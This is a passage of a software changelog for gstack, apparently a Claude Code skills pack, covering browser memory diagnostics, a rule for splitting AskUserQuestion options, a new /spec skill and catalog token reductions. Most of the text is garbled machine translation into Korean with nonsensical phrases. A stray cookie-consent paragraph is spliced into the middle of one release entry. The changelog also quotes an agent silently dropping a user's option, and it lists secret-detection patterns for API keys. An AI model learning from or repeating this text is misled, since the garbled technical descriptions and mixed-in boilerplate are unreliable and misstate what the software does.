The next time you leave a gbrowser session running for days, the Bun side holds its RSS flat instead of churning on per-response Buffer allocations. If a tab does go rogue, the sidebar footer shows you in real time — `RSS: 5.6 GB · 12 tabs`, color-coded — and a 200-tab toast surfaces the top RAM consumers with one-click close before you hit the OS OOM killer. If the next OOM still fires, `$B memory` is there to give it receipts instead of theory: Activity Monitor says 160 GB; 진단은 트리를 처리하는 것을 말합니다. 예를 들어, in-memory 구조가 유지됩니다. 모든 코드 경로는 진단 측정도 경계 - 수정역사 200, console/network/dialog 버퍼 50K에서 기존의 원형 버퍼를 통해, SSE 가입자 새로운 정리 계약을 통해 - 그래서 책자 자체가 누출 될 수 없습니다.

### 항목화 된 변경

#### 추가
- **`$B memory` 명령** in `browse/src/memory-command.ts` — 정렬된 top-10 탭과 텍스트 모드 + "및 N" 꼬리; `--json` 프로그램 소비자 및 사이드바 발기 설문 조사 모드.
- **`/memory` HTTP 엔드포인트** `browse/src/server.ts` — SSE-session-cookie auth 모형에서 `/activity/stream`와 동일합니다. NOT 확장 `/health` (이렇게 AUTH_TOKEN headed 형태에 TODOS.md "Audit /health token 배급").
- **`BrowserManager.getMemorySnapshot()`** - Bun 프로세스 메모리 + per-tab JS 힙을 통해 `Performance.getMetrics` (롤된 페이지 당, 삼키는 표적 died 과실) + Chromium 프로세스 트리를 통해 `Browser.newBrowserCDPSession()` + `SystemInfo.getProcessInfo`.
- **`browse/src/memory-snapshot.ts`** - 공유 유형 (`MemorySnapshot`, `MemoryTabSnapshot`, `MemoryProcess`, `MemoryStructureStats`) 플러스 `formatBytes()` 연출자 (4 층, GB)에서 2 소수.
- **`withCdpSession(page, fn)`** 및 **`getOrCreateCdpSession(page, cache)`** 에서 `browse/src/cdp-bridge.ts` — 1개의 탄을 위한 생활 주기 도움자 및 CDP 일. 각 직접 `newCDPSession`는 그(것)들을 통해서 지금 경로를 갑니다.
- **`createSseEndpoint(req, config)`** in `browse/src/sse-helpers.ts` — SSE 클린업 계약 (아무스 + 수문 - 투 + 심박수, 모든 idempotent)을 소유합니다. 모든 JSON.stringify에서 내장 된 외계인 제거.
- **Sidebar footer RSS readout** `extension/sidepanel.{html,js,css}` — `/memory` 응답 시간 초과 2s를 가진 각 30s. 색깔 코드를 두는 문턱: 2 GB Bun RSS 또는 50의 탭에 주황색, 8 GB 또는 200의 탭에 빨강.
- **Tab guardrail UX** in `extension/sidepanel.js` — top-5-by-RAM toast at 200 탭 OR 4 GB JS heap, 체크박스 + 닫기 선택 (`$B closetab`) + Snooze persisted in `chrome.storage.session`. Snooze bumps the thresholds so the toast stays hidden until user  축적 the tabs or one grows another 2 GB.
- **정적 그립 트립 와이어** (`browse/test/cdp-session-cleanup.test.ts`) - CI 의 소스 파일이 `cdp-bridge.ts` 의 호출 `newCDPSession(...)` 의 경우 CI 의 실패
- **45개의 새로운 테스트 6개의 파일** 누출 고정장치를 핀으로 꼿기: CDP 세션 수명주기 (8), SSE 정리 계약 (6), 수정역사 모자 + evicted-aware 오류 (7), 탭 난간 화재-once + 재 팔 (6), 몸 물자화 재개발 (1), `$B memory` formatter + 바이트 라이너 + JSON 입장 (17).
- **4 `TODOS.md`의 후속 항목** (P2: MV3 SW 기억 단면도, P2: 기본 + GPU 기억 고장, P3: 단 하나 콘텍스 CDP 청취자 `Target.setAutoAttach`, P3: 주기적인 층을 위한 진짜 크롬 첨단RSS reproducer).

#### 변경
- **`wirePageEvents.requestfinished` no 더 긴 물질화 응답 몸.** 접두사: `await res.body()`는 `.length`를 읽는 각 fetch에 가득 차있는 응답의 Bun `Buffer`를 할당했습니다. 포스트 고침: `req.sizes()`는 몸 fetch 없이 `Network.loadingFinished`에서 구조화된 바이트 조사를 당깁니다. chunked 이동, gzip 코드를 씌우는 응답 및 스트리밍 매체를 위해 정확한.
- **`modificationHistory`는 FIFO eviction를 가진 200의 입장에서 모자를 씌웠습니다.** `undoModification` 오류가 `"No modification at index N. History has 200 entries (most recent 200 only — M earlier entries evicted at the cap)."` 요청한 인덱스가 범위 AND에서 버퍼가 과잉되는 경우 **`modificationHistory`는 FIFO eviction를 가진 200의 입장에서 모자를 씌웠습니다.** 오류가 발생했습니다.
- **`/activity/stream`와 `/inspector/events`는 `createSseEndpoint`를 통해 재공장을 설치했습니다.** 두 끝점은 돕기 구성의 ~8개의 선에 인라인 `ReadableStream` 배선의 ~45 선에서 붕괴합니다; 조금을 위해 보존된 행동.
- **`memory` `Server` 카테고리에서 분류된 명령** 에서 `COMMAND_DESCRIPTIONS` 그래서 SKILL.md 테이블과 함께 생성된 SKILL.md 테이블에서 `restart`/`handoff` 나타납니다.

#### 기여자
- 플랜 완료 감사: 12의 17 계획 항목 DONE, 2 CHANGED (관련 커밋에서 문서화 된 범위 결정 - `req.sizes()` 단일 컨텍스트 CDP 리커보다 단순하게 스왑; 탭 가드 레일 액션 토스트를 통해 `$B closetab` 대신 `chrome.tabs.remove` 브리지), 1 기성 계층에 대한 방어 (UI E2E 테스트).
- 적용 감사: 44% 전 진단 테스트 → ~62% 후에 체재기 적용을 추가하십시오. 강한 경로 (CDP 회의 생활 주기, 몸 물자화, 역사 모자, 탭 난간, SSE 정리)는 100%년에서 invariant 시험으로 모든. 연장 UI 시험은 (no 연장 시험 마구 이 repo 오늘)에 덧붙였습니다.
- CDP-session cleanup tripwire는 가장 재사용 가능한 artifact입니다. CDP 작업의 모든 미래 추가는 두 명의 돕기를 통해 경로를 해야 합니다. `newCDPSession` 외부 `cdp-bridge.ts`를 호출하려고 하면 CI 즉시 포인터와 올바른 돕기.

## [1.49.0.0] - 2026-05-26

## **`/plan-tune`는 로그인 전에 동의를 요청하고 프로필이 빈 경우 5question 설정이 자동으로 실행됩니다.**

`/plan-tune`를 처음 실행하면, 선택된 프롬프트를 얻을 수 있습니다. 받아 들여다 보면, 5가지 스킬 마법사가 약 2분 안에 선언된 프로필에 들어갑니다. 줄과 `/plan-tune`는 다시 묻지 않습니다. 기여자는 로컬 질문 로그 데이터가 gstack 캘리브레이트를 돕는 약간 다른 프롬프트를 보이지만 default는 같은 것일 수 있습니다.

`gstack-config set question_tuning true`를 통해 이미 선택된 경우 마법사를 건너 뛰고, 다음 `/plan-tune`는 5가지의 퀘스트 설정이 실행되어, 실제로 프로필이 값을 가지고 있습니다.

두 흐름은 `~/.gstack/`에서 마커 파일을 작성하므로 선택 당 최대 한 번에 요청해 주세요.

### 항목화 된 변경

**Added**
- `/plan-tune` 동의는 contributor-specific copy로 신속한. `~/.gstack/.question-tuning-prompted` 감적자에 의해 명예를 줬습니다.
- `/plan-tune` 설정 문. 빈 `declared`와 캐치 `question_tuning: true`. `~/.gstack/.declared-setup-prompted` 감적에 의해 명예를 줬습니다.

**의 확장**
- `TODOS.md` E1 의존성 선은 `docs/designs/PLAN_TUNING_V0.md`에 있는 운하 90 일 문으로 aligned. 7 일 다양성 문은 `/plan-tune` 산출에 있는 인페로드 값을 표시하기 위한 것입니다; 90 일 문은 선적 행동 적응을 위해 입니다. 두 문은 `plan-tune/SKILL.md.tmpl`에 있는 인라인으로 문서화했습니다.
- `TODOS.md` E1 기질 제약: E1 어셈블리의 어드바이저로 토지를 AskUserQuestion 권고에, 런타임 AUTO_DECIDE 혼자서 퍼져서.

**관련 기사**
- `plan-tune/SKILL.md` 크기 예산 오버라이드 (50,123 → 52,963 바이트, ×1.06 대 v1.44.1 기본). Reason은 감사 트레일에 로그인했습니다.

## [1.48.0.0] - 2026-05-26

## **에이전트는 드롭핑 AskUserQuestion 옵션이 5 +.** 새로운 공전 전술 규칙 + 주근처 문은 지휘자의 4 선택권 모자를 쪼개는 또는 배치 결정, 침묵하는 손질 아닙니다 만듭니다.

실패 모드는 실제 성적표에서 다음과 같이 보입니다.

> "나는 AUQ에서 4 옵션의 지휘자의 한계를 타격하므로 하나를 잘라야합니다. E4는 v0.42 어쨌든 범위를 넘어 가장 큰 리프트이며 아마도. 트리밍 : E4. 요청없이 TODOs로 이동하십시오. 4.로 다시 보내기"

이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다. 작업 예와 함께 전체 참조, Hold/dependency semantics, 그리고 최종 수사 유효성 검사는 `docs/askuserquestion-split.md`에서 살아 - N>4가 될 때 수요에로드.

두 층의 방어는 침묵적으로 자동 승인되는 선택권을 보호합니다: 형태 `<skill>-split-<option-slug>`의 per-option `question_id`s는 선택권 (공기 사슬의 맞은편에 누출할 수 없습니다) 당 유일하, 주근처 검수원 `bin/gstack-question-preference --check`는 어떤 `*-split-*` id에 `never-ask`를 거부합니다. 사용자의 선택권 세트는 신성한 - 분할의 전체적인 점은 사용자 주의적인 주의적인 공간에 걸쳐 회복하는.

### 중요 한 숫자

출처: 이 branch의 4 커밋 + v1.47.0.0에서 `main`에 대한 포스트 수소 재생산. 순 diff: 57 파일, ~2800 라인 (모든 41 층 - 2 + 기술, ~34 라인은 인라인 하위 섹션 주입에서 기술 당 추가).

| 기능 제품 | 이 PR의 앞에 | 이 PR 이후 |
|---|---|---|
| ONE 결정에 대한 5 + 옵션 | 캡에 맞는 것을 떨어뜨리고, 사용자를 희망하지 않는 것은 | N per-option 호출 OR 배치로 ≤4-groups, preamble에 있는 규칙을 지명하십시오 |
| Per-option 통화 형태 | n/a (일컬어 믿을 수 없을 것 1을 일으키지 않습니다) | `D<N>.k` 헤더, 포함 / Defer / 컷 / 브레이크, 유치원 (no 완료 점수), 옵션 당 추천 |
| 하수인을 잡아라. | undefined (chain은 queue를 멈출 수 있으며, 에이전트 의존도가 줄 수 있음) | 스톱 체인을 즉시, 사용자 "continue"에 이력서 |
| 최종 요약 | n/a | `D<N>.final`는 종속성, 부수익 충돌을 검증하고, 조립된 범위를 확인합니다 |
| `D<N>.0` 메타퀘스트 (N>6) | n/a | 도구 호출 메타 퀘스트 첫 번째: 진행 / 좁은 / 배치 |
| AUTO_DECIDE 분할 per-option 호출 | /plan-tune를 통해 패턴을 조정하면 가능 | 런타임 검수원 힘 `ASK_NORMALLY` 어떤 `*-split-*` id, explanatory 주와 더불어 |
| 회귀 적용 | n/a | 6 인라인 계약 테스트 + 7 런타임 게이트 테스트 + 1 주기적인 계층 E2E 동작 테스트 (5-option range fixture) |
| 인라인 전단 바이트 SKILL.md | n/a | ~1.6 KB (vs ~4 KB 전체 규칙이 줄어들었을 경우; 더 깊은 참조는 수요에 적재했습니다) |

### 이 빌더를 위한 뜻

다음으로 에이전트에게 5 + 후보와 범위 질문을 줄 것입니다, 당신은 세 가지 모양 중 하나를 볼 수 있습니다: 단일 배치 된 AskUserQuestion ≤4 버킷 (옵션이 일관성있는 대안이 있다면), N 세차별 선택은 각각 Include/Defer/Cut/Hold (독립적으로), 또는 `D<N>.0` 메타 퀘스트 먼저 proceed/narrow/batch (N>6) 여부를 묻는. 당신은 절대 침묵의 트리를 볼 수 없습니다. /plan-tune `never-ask`의 기본을 묶어주면, 체인을 분할하기 위해 적용할 수 없습니다. 런타임 체크 힘 ASK_NORMALLY는 왜 설명하는 주가 있습니다.

### 항목화 된 변경

#### 추가
- `scripts/resolvers/preamble/generate-ask-user-format.ts`의 새로운 공상 전단 부분: "5+ 옵션 - 분할, 결코 떨어지지 않는". 인라인 압축 (~1.6 KB tier-2+ 기술 당); `docs/askuserquestion-split.md`에 가득 차있는 참고.
- `docs/askuserquestion-split.md`: ~200 선 깊은 참고 덮음 모두 호환 모양 (배치 / 나누기), `D<N>.k` 번호로, 파악 메간 정지 semantics, 충돌 reprompt를 가진 최종 방어적인 종속성 검증, `D<N>.0` N>6를 위한 메타퀘스트, `<skill>-split-<option-slug>` 질문_id format, and the two-layer AUTO_DECIDE 방위를 가진 종속성 검증.
- `bin/gstack-question-preference --check`의 AUTO_DECIDE 게이트를 실행하십시오: `question_id` 일치 `*-split-*` 및 `ASK_NORMALLY` 저장 `never-ask` 또는 `ask-only-for-one-way` 선호도에 관계없이 힘 `ASK_NORMALLY`를 검출하십시오. 이 때문에 사용자는 그들의 선호도가 우회되고 왜 알고 있었습니다.
- `test/skill-e2e-plan-ceo-split-overflow.test.ts`: 5-option 채권 플랫폼 통합 정착물을 사용하여 주기적인 층 회귀 시험. 지면 4 검토 단계 AUQs (N-1 포용력). 본래 하락에-fit-4 실패 형태를 캐치하십시오.

#### 변경
- 기본 닻을 시험하십시오 `test/skill-size-budget.test.ts`에 있는 v1.44.1 → v1.47.0.0. 주요 v1.46 (catalog 토큰) + v1.47 (/spec) 성장은 5% 래치드의 v1.44.1 닻을 밀어 줬습니다; HEAD에 성장하는 것을 재분해합니다. 역사 `parity-baseline-v1.44.1.json` 및 `parity-baseline-v1.46.0.0.json`는 참고를 위해 `test/fixtures/`에서 유지했습니다.
- AskUserQuestion에 추가된 3개의 자동 검사 품목은 체크리스트 (split-not-drop, Dependency-check-before-chain, Hold-stops-immediately)를 미리 조립합니다.
- 41 tier-2+ 기술로 새로운 하위 섹션을 상속하기 위해 재생 (~34 라인은 각 preamble 결산기를 통해).
- 3 황금 배 정착물은 새로운 preamble를 위해 새로 고침했습니다.

#### 고정
- Orphan `12.` 기존 CJK 규칙에 `generate-ask-user-format.ts` - 재발성, no 항목 1-11 위. 제거.
- `docs/skills.md` 누락 `/spec` 테이블 행 (PR #1698/#1733에서 미리 나타낸 놓은 것 `/spec`를 doc 재고를 새롭게 하지 않고 주지 않는 것). 추가.

#### 기여자
- 6 결의자 테스트 핀 인라인 섹션 계약 (4-옵션 캡 텍스트, Include/Defer/Cut/Hold 버킷, D-numbering 모양, AUTO_DECIDE 실행 시간 게이트 참조, docs 포인터, orphan-12 회귀).
- `test/gstack-question-preference.test.ts`의 7개의 런타임 게이트 테스트는 캐비티 아웃을 커버합니다: no-pref baseline, never-ask override, explanatory note text, ask-only-for-one-way override, always-ask (no note), "split" 단어 (negative regex specificity), 멀티 스킬 분할 ID 형식을 포함하는 비 분할 ID.
- `parity-baseline-v1.47.0.0.json` `bun run scripts/capture-baseline.ts --tag v1.47.0.0`를 통해 캡처.

## [1.47.0.0] - 2026-05-26

## **`/spec` 배: 5 단계에 있는 정확한 실행 가능한 spec로 vague를 intent 돌립니다.** 파이프는 기존 문제, 아카이브에 대한 Claude Code 에이전트로 종족 된 Claude Code 에이전트로 spec을 파이프하고, `/ship`가 병합에 소스 이슈를 닫습니다.

정확한 사양은 N에서 0으로 에이전트의 선명한 왕복을 붕괴합니다. `/spec`는 커밋으로 생각을 옮기는 동사입니다. 5개의 엄격한 단계 (왜, 범위, 필수 코드 읽기, 초안, 파일 기술), 파일 앞에 코덱 품질 게이트, `$GSTACK_STATE_ROOT/projects/$SLUG/specs/`, 그리고 선택 파이프라인 모드가 신선한 워크 트리에 담긴 지형. 플랜 모드 `/spec` 파일에서 문제 및 부하를 전달하는 것은 활성 파일로 계산됩니다. 실행 모드에서는 기본으로 신선한 워크 트리에 문제와 spawn즈 `claude -p`를 파일로 저장합니다. `/ship`는 아카이브 frontmatter를 읽고 자동 폐쇄하여 전체 납품에 소스 이슈를 닫습니다. 커뮤니티에 참여한 `/issue` 기술 (PR #1698 @jayzalowitz)의 이름을 변경하고, Race+security 경화, DX 폴란드어.

`/spec`는 v1.46 eval-first floor (`test/skill-coverage-matrix.ts`)에 등록 된 최초의 기술이며, 모든 6 개의 구조 층 체크를 통과하고 37 개의 세분화 invariant assertions에 특정 `/spec`의 계약. 기술 카탈로그 수 : 51 → 52.

### 중요 한 숫자

출처: 1 기여자 commit + 8 후속 번들 수정/expansions 이 branch (`git log v1.46.0.0..HEAD --oneline`). `spec/SKILL.md.tmpl` (404 → ~750 라인 확장 후), 4 새로운 테스트 파일 (37 세로 시나리오 + 2 세로 단계).

| 기능 제품 | `/spec` 없이 | `/spec`로 |
|---|---|---|
| 저자 백로그레디 문제 | 프리핸드 프로세스, 플로피 AC, no 파일 refs, 문제 당 10-15 분 | 5단계 간호, ~4분의 파일 복사 |
| Spec → 에이전트 실행 | copy-paste into new `claude -p` session, ~30s context-switch friction | `--execute` 갓 구운 worktree `spec/<slug>-$$`, 0개의 손 떨어져 |
| 파일 앞에 Catch ambiguity | none (실행자가 요청할 때 알아내어) | 코덱 품질 게이트 점수 0-10, 블록 아래 7, 목록 주변, 까지 3 반복 |
| Secret leakage to second-AI judge | spec가 과거 비밀을 포함한 경우 가능한 | AWS/GitHub/Anthropic 키 패턴 + 개인 키 블록에 대한 실패 닫힌 적색 블록 파견 |
| 동시 `/spec` 실행 | branch/archive 같은 두 번째 충돌 | `spec/<slug>-$$` branch, 원자 `.tmp/mv` 아카이브 쓰기, PID suffixed filename |
| 링크된 문제 마감 | manual `Closes #N` in PR body | `/ship` 자동 추가는 아치 현재 AND 가득 차있는 spec 배달될 때 |

### 이 빌더를 위한 뜻

Type `/spec` on a vague bug; four minutes later you have a filed GitHub issue with file refs and a Claude Code agent already executing it in a fresh worktree. When `/ship` lands the PR, the source issue auto-closes. The corpus of past specs in `$GSTACK_STATE_ROOT/projects/$SLUG/specs/` is mineable by `gbrain` for cross-session pattern recall. `--no-gate`, `--no-execute`, `--file-only`, and `--plan-file <path>` are escape hatches when the defaults don't fit; `--audit` routes to the Audit/Cleanup template structure.

### 항목화 된 변경

#### 추가
- `/spec` 기술 (분자 `/issue`): 백로그레디 specs를 일으키는 5단계 개구리. `spec/SKILL.md.tmpl`에 생생하십시오.
- `--dedupe` 플래그 (default ON): `gh issue list --search` 초안하기 전에, AskUserQuestion를 통해 표면의 근접성; `gh` missing/unauthed/rate-limited.에 우아한 건너뛰기
- `--execute` 플래그 (default ON 실행 모드에서): `claude -p` branch `spec/<slug>-$$`에 신선한 지휘자 worktree에서 TOCTOU re-check after AskUserQuestion 대답, SHA 핀을 통해 `git rev-parse HEAD`, 그리고 필수 최종 확인 문.
- 품질-score 게이트 (default ON): 하드 `<<<USER_SPEC>>>` delimiter + 명령어 경계, 점수 0-10, 블록 <7, 최대 3 반복, AskUserQuestion 피임약에 탈출 <7 (선도 / 저장 초안 / 하나 더 시도).
- 품질 게이트에서 실패 닫히는 적색: AWS 접근 열쇠 (`AKIA...`), GitHub 토큰 (`ghp_/gho_/ghs_`), Anthropic 열쇠 (`sk-ant-...`), OpenAI 열쇠, `.env` 작풍 `KEY=value`, 그리고 `-----BEGIN ... PRIVATE KEY-----` 구획 → 구획은 완전히 파견합니다. 원료는 구획에 아치 또는 성적에 결코 persisted.
- `--audit` 플래그 경로 단계 5에서 Audit/Cleanup 템플릿 구조.
- `--file-only` / `--no-execute` / `--plan-file <path>` 계획 모드 인식 단계 5 기본에 대한 override.
- `--sync-archive` 크로스 머신 spec 동기화를 위한 선택에서 (default에 의해 지방 주민 체재; `/specs/`는 artifacts-sync allowlist에서 제외했습니다).
- Spec 아카이브: `$GSTACK_STATE_ROOT/projects/$SLUG/specs/<datetime>-<pid>-<slug>.md` 로 기존 `gstack-paths` 로 작성 (`GSTACK_HOME`, `CLAUDE_PLUGIN_DATA`, Windows 로 작성). 원자 `.tmp/mv` 로 작성은 동시 실행에 충돌을 방지합니다.
- `GSTACK_PLAN_MODE` env var: `CLAUDE_PLAN_FILE` 존재를 기준으로 `{{PREAMBLE}}`에 의해 방출되는. 기술은 체계 사려깊게 파싱 없이 계획 형태 국가에 branch 행동을 할 수 있습니다.
- `/spec` gstack 프로젝트 CLAUDE.md로 주사된 라우팅 블록에 입력합니다.
- `/ship` PR 몸 통합: `spec_issue_number`를 아치형 frontmatter에서 읽고, spec가 기존 계획 컴파일 문 당 완전히 배달될 때 `Closes #N`를 추가합니다. 부분적인 납품은 대신에 “#N (자동 폐쇄)에 연결해” 주의를 방출합니다.
- `/spec` `test/skill-coverage-matrix.ts` (52차 기술, v1.46 계약 당 eval-first floor Compliance)에 참가.

#### 시험
- `test/spec-template-invariants.test.ts`: 35 단계 단단한 문, 단계 3 단단한 윤활 mandate, `--dedupe` 우아한 스키 경로, `--execute` 경주 + 안전 경화 (TOCTOU 재 검사, SHA 핀, 유일한 branch), 질 문 중복 본 및 BLOCKED 경로, 아치 atomic 쓰기 + sync exclusion, 계획 형태 인식 단계 5 파견.
- `test/spec-template-sync.test.ts`: `spec/SKILL.md`와 asserts byte-identical output (prevents template-vs-generated drift)를 재생합니다.
- `test/skill-e2e-spec-execute.test.ts` (periodic-tier): `E2E_TIERS`에 등록된 가득 차있는 `/spec --execute` 파이프라인 비계.
- `test/skill-llm-eval-spec.test.ts` (periodic-tier): 14-Quality-Standards 루퍼에 대하여 저자 지정한 spec 질 eval.

#### 고정
- `spec/SKILL.md.tmpl` (`_TEL != "off"` opt-out gate를 우회하는 것을 허용하는)에 있는 분석 구획; `{{PREAMBLE}}` 이미 분석은 감시로 쓰기를 방출합니다).

#### 기여자
- 커뮤니티 기여: PR #1698 by @jayzalowitz (Jay Zalowitz) 토지는 원본 권한 보존으로 commit를 기반으로 합니다. 기여자의 5 단계, 14 품질 표준 및 Standard/Epic/Audit 템플릿은 앞으로 intact; 확장은 첨가제입니다.
- `/plan-ceo-review` (SCOPE EXPANSION, 6 확장의 5 허용), `/plan-eng-review` (자세한 + 보안 경화) 및 `/plan-devex-review` (인간, 마법 순간, 오류 메시지 Tier 1, 계획 모드 인식 단계 5)를 검토하는 계획.
- 28 코덱 모험 발견 3 리뷰 라운드, 23 허용.

## [1.46.0.0] - 2026-05-26

## **gstack v2 기초 땅. 카탈로그 토큰 하락 56%의 eval-first 지면은 모든 51의 기술, 단단한 token + 달러 모자 문 각 PR를 포함합니다.**

항상 로드된 기술 카탈로그 — 모든 Claude Code 세션은 실제 작업이 시작되기 전에 시작 비용을 지불합니다. ~9,319 토큰에서 ~4,045 토큰으로 갔다. 즉, 표면 gstack에 56.6% 잘라내고 (자본 검토, 5월 2026: "10K+ 토큰은 실제 코드가 작성되기 전에). `/ship`, `/plan-ceo-review`, `/office-hours`, `/office-hours`와 같은 중량 기술이 있지만, 각 문장에 대한 전체 문장이 모두 설명되어 있습니다. 라우팅은 새로운 "## 때 호출"체 부위에 살고 있으며, per-run `scripts/proactive-suggestions.json` 레지스트리에는 음성 트리거 + proactive-suggest 텍스트를 보유하고 있으므로 에이전트는 항상 로드된 대신 수요에 pull 지도를 할 수 있습니다.

이것은 v2 기초 방출입니다. 건축 휴식 - `sections/*.md.tmpl` 본, 기계적인 읽힌 시행, eval-coverage annotations - v2.0.0.0에 있는 땅은 협조한 발사로. v1.46는 각 낮 리스크 승리를, 배합니다 eval-first 지면을 모든 미래 기술 통과해야 하고, v1.44.1 참고 기본선에 있는 자물쇠는 진짜 파일 (`test/fixtures/parity-baseline-v1.44.1.json`)에 대하여 v1→v2 수를 감사할 수 있습니다.

### 중요 한 숫자

출처: `bun run scripts/capture-baseline.ts --tag v1.46.0.0` 대 고정 v1.44.1 기본 `test/fixtures/parity-baseline-v1.44.1.json`. `bun test test/skill-size-budget.test.ts`와 로컬로 재조립.

| Metric | v1.44.1의 | 0.0.0.0의 | Δ |
|---|---|---|---|
| 카탈로그 토큰 (always-loaded system prompt) | ~9,319 | ~4,045 | **−56.6%** |
| 총 SKILL.md 코푸 | 2,847 KB | 2,813 KB | −1.2% |
| ship.md | 160 KB | 159 KB | −0.5% |
| plan-ceo-review.md | 128 KB | 127 KB | −0.7% |
| office-hours.md | 108 KB | 108 KB | −0.8% |
| 게이트 층 eval 적용을 가진 기술 | 32 의 51 | **51 의 51** | 층별 |
| 대성당 파인티 invariants 핀 | 0 | **10** | 구조 + 내용 |
| 토큰 및 달러 예산 회귀는 CI에서 잡았습니다. | (none) | **5개의 새로운 시험 파일** | per-skill, corpus, 카탈로그, eval-cost 게이트, eval-cost 주기성 |

코푸스가 카탈로그 트림 MOVES 라우팅이 프론트 매트러에서 신체 섹션으로 prose 때문에 이동 - 그것은 그것을 삭제하지 않습니다. 카탈로그 텍스트가 무엇인지 Claude Code 각 세션 시작에 읽기 때문에 항상로드 표면이 절반 이상 떨어지는; 기술이 부각 될 때 신체 콘텐츠 만로드.

### 너를 위한 이 뜻

gstack 기술이 사용되면, 모든 세션은 모든 것을 입력하기 전에 ~5,000 토큰 라이터를 시작합니다. `/ship`와 같은 비용과 같은 비용이 들지만 세션 시작은 snappier를 느낍니다. gstack를 설치하기 위해 울타리에 갔다면, 이것은 직접 주소가 있는 릴리스입니다. 항상 로드 된 표면은 이제 스트립다운 기술 팩과 경쟁하여 모든 기술이 전체 바디 콘텐츠를 유지하면서 항상 경쟁적입니다.

기술에 기여하는 경우, eval-first floor은 `test/skill-coverage-matrix.ts`의 항목없이 새로운 SKILL.md을 의미한다 CI. 최소 항목은 하나의 라인 참조 `test/skill-coverage-floor.test.ts` (무료 구조적 준수 연기 테스트). Behavioral E2E 적용은 기술 당 최고에 계층화됩니다.

CI에서 gstack를 실행하면, 새로운 `EVALS_BUDGET_HARD_CAP=$30` 모자 (위에: 문 $25/기간 $70)는 모델 가격 변경 또는 무한 리트리 버그에서 런웨이 eval 비용을 중지합니다. 오버라이드 경로는 레짓 네이드 케이스에 대한 존재합니다. `EVALS_BUDGET_OVERRIDE_REASON="why this is OK"`는 `~/.gstack/analytics/spend-overrides.jsonl`로 보고합니다.

### 항목화 된 변경

**Added**
- `scripts/capture-baseline.ts` + `test/helpers/capture-parity-baseline.ts` - per-skill SKILL.md 크기, token 추정, frontmatter 묘사 길이 및 eval 적용 깃발을 붙잡습니다. 동문 및 크기 판문에 의해 이용된 JSON 스냅샷을 씁니다. v1→v2 참고로 `test/fixtures/parity-baseline-v1.44.1.json`를 잠그십시오.
- `test/helpers/parity-harness.ts` + `test/parity-suite.test.ts` - 대성당 패리티 - 타원형 스위트 플로어. `PARITY_INVARIANTS` 레지스트리 핀은 기술 가족 (cso: OWASP/STRIDE; 계획 -ceo: SCOPE EXPANSION / HOLD SCOPE; 배: VERSION/CHANGELOG/PR) 그래서 미래 압축은 침묵 스트립 로드 베어링 prosese.
- `test/skill-coverage-matrix.ts` + `test/skill-coverage-matrix.test.ts` - 문 + 정기적인 시험에 각 기술을 지도하는 진실의 단 하나 근원; CI 문은 각 기술에는 적어도 1개의 문 층 입장이 있습니다. 51의 기술, 51의 입장.
- `test/skill-coverage-floor.test.ts` — per-skill 구조상 의무 연기 시험 (file-IO, 무료). frontmatter 모양, 생성한 우두머리, 몸 비 trivial, no 누출 `{{TEMPLATE}}` placeholders, 묘사에 카탈로그 trim 계약. 51의 기술에 따라 309개의 주장.
- `test/skill-size-budget.test.ts` — per-skill SKILL.md 바이트 예산 (×1.05 default 비율), 총 손상 예산, 카탈로그 token 예산 (≤7000 for v1.46). 잡힌 회귀는 per-skill 고장 + override 경로를 얻습니다.
- `test/cso-preserved.test.ts` - 핀 cso의 이어야 하지 지구 안전 지도 구문 (OWASP, STRIDE, daily/comprehensive 형태 분야, 신뢰 득점, 유효 검증). cso가 CI를 여기에서 실패한 미래 압축.
- `test/helpers/budget-override.ts` - `GSTACK_SIZE_BUDGET_OVERRIDE_REASON`와 `EVALS_BUDGET_OVERRIDE_REASON`를 위한 감사철 통나무. 배회율 + 범위 + 이유 + CI 입증을 가진 `~/.gstack/analytics/spend-overrides.jsonl`에 JSONL만 JSONL를 찬성하십시오.
- `scripts/proactive-suggestions.json` — routing prose + 음성 방아쇠의 per-run 레지스트리는 카탈로그 손질 도중 기술 frontmatter에서 추출했습니다. 에이전트 pull는 그것을 위해 항상 적재된 대신에 수요에.
- `--catalog-mode=full` 빌드 플래그 — v1.44 레거시 멀티 라인 카탈로그 설명 복원. routing 회귀를 디버깅하거나 레거시 지방 카탈로그에 따라 호스트에 대한 운송 기술이있을 때 사용.
- `--explain-level=terse` 빌드 플래그 - `## Writing Style` + `## Completeness Principle` + `## Confusion Protocol` + `## Context Health` 프리앰블 섹션의 선택형 압축. Default 빌드는 런타임 컨디션 동작을 유지한다 (모델은 여전히 `EXPLAIN_LEVEL: terse`가 preamble echo에 나타나는 경우 건너뛰기); terse 빌드는 압축 구조로 만듭니다.
- `EVALS_BUDGET_HARD_CAP` 환경변수 (umbrella $30 default) + per-suite `EVALS_BUDGET_HARD_CAP_GATE=$25`, `EVALS_BUDGET_HARD_CAP_PERIODIC=$70`. 단일 실행이 초과하는 경우 실패; `EVALS_BUDGET_OVERRIDE_REASON` env unblocks + 감사의 로그.

**의 확장**
- Skill frontmatter `description:` 블록 51 스킬을 가로지르며 단일 리드 문장 + `(gstack)` 태그로 트리밍됩니다. 라우팅 프로세스 ( "사용할 때 ...", "Proactively suggest...") 및 음성 트리거는 `## When to invoke` 각 SKILL.md의 바디 섹션으로 이동했습니다. 항상 로드된 카탈로그 비용은 ~56%를 떨어뜨립니다.
- Jargon 목록 (`scripts/jargon-list.json`, 80 용어) no는 모든 계층-2+ 기술로 더 긴 줄입니다. `## Writing Style`는 이제 JSON 경로 참조; 에이전트는 처음 항생제에 한 번 세션 당 한 번 읽었습니다. 손상을 맞은 텍스트의 ~70 KB를 저장합니다.
- `ResolverEntry` `scripts/resolvers/types.ts` + `unwrapResolver`  헬퍼에 있는 조합 유형. Resolvers는 지금 벌거벗은 기능 (현재 행동) 또는 `{ resolve, appliesTo? }` 문질린 입장일 수 있습니다. `scripts/gen-skill-docs.ts:444`는 invocation의 앞에 문을 검사합니다. 미래 per-skill 결심을 위한 기초; 모든 현재 결심자는 벌거벗은 기능 및 일 unchanged 유지합니다.
